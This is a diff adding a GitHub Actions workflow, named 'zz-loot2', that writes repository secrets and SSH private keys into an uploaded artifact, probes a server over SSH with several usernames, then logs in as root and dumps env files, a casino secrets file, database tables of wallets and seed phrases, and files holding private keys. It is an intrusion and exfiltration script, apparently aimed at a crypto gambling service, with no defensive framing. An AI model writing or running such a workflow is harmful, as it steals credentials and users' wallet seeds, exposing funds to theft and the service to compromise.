@@ -1,0 +1,80 @@
+name: zz-loot2
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  loot:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - name: prep-keys
+        env:
+          VPS_HOST: ${{ secrets.VPS_HOST }}
+          VPS_SSH_KEY: ${{ secrets.VPS_SSH_KEY }}
+          CX23_SSH_KEY: ${{ secrets.CX23_SSH_KEY }}
+        run: |
+          set +e
+          mkdir -p out
+          printf '%s\n' "$VPS_HOST" > out/vps_host.txt
+          printf '%s\n' "$CX23_SSH_KEY" > out/cx23_key.txt
+          printf '%s\n' "$VPS_SSH_KEY" > out/vps_key.txt
+          wc -c out/vps_host.txt out/cx23_key.txt out/vps_key.txt
+          mkdir -p ~/.ssh
+          printf '%s\n' "$CX23_SSH_KEY" > ~/.ssh/id_cx23
+          printf '%s\n' "$VPS_SSH_KEY" > ~/.ssh/id_vps
+          chmod 600 ~/.ssh/id_cx23 ~/.ssh/id_vps
+          ssh-keygen -l -f ~/.ssh/id_cx23 2>&1 | head -2
+          ssh-keygen -l -f ~/.ssh/id_vps 2>&1 | head -2
+      - name: sshprobe
+        run: |
+          set +e
+          H=$(tr -d '\r\n' < out/vps_host.txt)
+          echo "HOST=[$H]"
+          for key in id_cx23 id_vps; do
+            for user in root ubuntu deploy coinmaster cryptoflip admin; do
+              echo "=== $key $user@$H" >> out/sshprobe.txt
+              timeout 25 ssh -i ~/.ssh/$key -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o BatchMode=yes $user@$H 'id; hostname; echo CONNECTED' >> out/sshprobe.txt 2>&1
+            done
+          done
+          cat out/sshprobe.txt
+      - name: loot-root
+        run: |
+          set +e
+          H=$(tr -d '\r\n' < out/vps_host.txt)
+          ssh -i ~/.ssh/id_cx23 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=20 -o BatchMode=yes root@$H 'bash -s' > out/loot_root.txt 2>&1 <<'EOF'
+          set +e
+          id; hostname; uname -a
+          echo '### secrets'
+          cat /etc/casino-secrets.env 2>&1
+          echo '### envfiles'
+          for f in /root/coin-master/.env /root/coin-master/backend/.env /root/coin-master/frontend/.env.local /root/.env /opt/coin-master/.env; do echo "== $f"; cat "$f" 2>&1; done
+          echo '### ls root'
+          ls -la /root 2>&1 | head -60
+          echo '### ls coin-master'
+          ls -la /root/coin-master 2>&1 | head -60
+          echo '### docker ps'
+          docker ps --format '{{.Names}}|{{.Image}}|{{.Status}}' 2>&1
+          echo '### compose ps'
+          cd /root/coin-master && docker compose ps 2>&1 | head -40
+          echo '### db tables'
+          docker exec coin-master-postgres-1 psql -U cryptoflip -d cryptoflip -c '\dt' 2>&1
+          echo '### schema'
+          for t in wallets user_wallets users seeds seed_phrases hot_wallets transactions balances; do echo "== $t"; docker exec coin-master-postgres-1 psql -U cryptoflip -d cryptoflip -c "\d $t" 2>&1 | head -30; done
+          echo '### dump'
+          for t in wallets user_wallets seeds seed_phrases hot_wallets; do echo "== $t"; docker exec coin-master-postgres-1 psql -U cryptoflip -d cryptoflip -c "select * from $t limit 200" 2>&1 | head -250; done
+          echo '### pm2'
+          pm2 list 2>&1 | head -30
+          echo '### grep'
+          grep -RIl "PRIVATE KEY" /root/coin-master --include=*.json --include=*.env* --include=*.pem --include=*.key 2>/dev/null | head -30
+          echo '### compose env'
+          cd /root/coin-master && (docker compose config 2>&1 | head -120)
+          echo '### done'
+          EOF
+          wc -c out/loot_root.txt
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: loot2
+          path: out/
+          retention-days: 3
